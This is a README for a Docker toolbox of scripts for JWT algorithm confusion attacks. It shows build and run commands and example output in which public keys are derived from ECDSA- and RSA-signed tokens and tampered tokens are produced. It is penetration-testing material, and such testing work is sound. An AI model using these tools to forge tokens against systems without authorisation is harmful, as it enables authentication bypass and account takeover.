# 💻 JWT toolbox

## 🎯 Description

The goal of this image is to provide a ready-to-use toolbox with differents having for th objective to perform differents kins of attack agianst [JWT](https://jwt.io/) tokens.

💡 Indeed, some existing scritp require specific runtilme/package/etc so the goal is have a quick ready-to-use sandbox to execute them to obtain crafted JWT token.

## 📦 Build

Use the following set of command to build the docker image of the toolbox:

```bash
git clone https://github.com/righettod/toolbox-jwt.git
cd toolbox-jwt
docker build . -t righettod/toolbox-jwt
```

💡 The image is build every week and pushed to the GitHub image repository. You can retrieve it with the following command:

`docker pull ghcr.io/righettod/toolbox-jwt:main`

## 🤔 Usage

Use the following command to create a container of the toolbox:

```bash
docker run --rm -it righettod/toolbox-jwt /bin/bash
# From here, use one of the provided script...
```

## 📋 Content

### Script 'generate-jwt-ecdsa-derivated-public-keys.rb'

> **Note**: Author of the script is the [PentesterLab](https://blog.pentesterlab.com/exploring-algorithm-confusion-attacks-on-jwt-exploiting-ecdsa-23f7ff83390f) team ❤.

Script to generate derivated **ECDSA** public keys from a JWT ECDSA signed token. To goal is to test exposure to algorithm confusion attacks on token using ECDSA key pair.

💻 Usage:

`ruby generate-jwt-ecdsa-derivated-public-keys.rb "JWT_ECDSA_SIGNED_TOKEN"`

💻 Example:

```bash
# Once in the bash of the toolbox
ruby generate-jwt-ecdsa-derivated-public-keys.rb "eyJ0eXA..."
[+] Key:
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE6mWiWnAqBhDvAWwyiM7+STTq0Csi
spjd61v7AtpvgKMyOHVMxMQ6yyrjVKp/syHteGSeltXdfEQ0Dlv0tkZQqg==
-----END PUBLIC KEY-----
[+] Key:
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE7zuf4prcB/qW4AL7d20LSb99Zwwl
hRSCnHTrpnHUnXoqZVAGwCNpYSJf1rpjZQocwwEL016+OuspiQ67N9EDoA==
-----END PUBLIC KEY-----
```

### Script 'generate-jwt-rsa-derivated-public-keys.sh'

> **Note**: Author of the tool used by the script is the [Silent Signal](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/) team ❤.

Script to generate derivated **RSA** public keys from a JWT RSA signed token. To goal is to test exposure to algorithm confusion attacks on token using RSA key pair.

💻 Usage:

`bash generate-jwt-rsa-derivated-public-keys.sh "JWT_RSA_SIGNED_TOKEN_1" "JWT_RSA_SIGNED_TOKEN_2"`

💻 Example:

```bash
# Once in the bash of the toolbox
bash generate-jwt-rsa-derivated-public-keys.sh "eyJ0eXA..." "eyJ0eXA..."
[*] GCD:  0x6b
[*] GCD:  0xd7b8aa3...
[+] Found n with multiplier 1  :
 0xd7b8aa...
[+] Written to d7b8aa3fc15ccb45_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJ...'
[+] Written to d7b8aa3fc15ccb45_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiH...'
==============================================================
Here are your JWT's once again for your copypasting pleasure
==============================================================
eyJ0eXAiOiJKV1Qi...
eyJ0eXAiOiJKV1Qj...
```

## 🤝 Sources & credits

* <https://blog.pentesterlab.com/exploring-algorithm-confusion-attacks-on-jwt-exploiting-ecdsa-23f7ff83390f>
* <https://github.com/silentsignal/rsa_sign2n>
* <https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/>
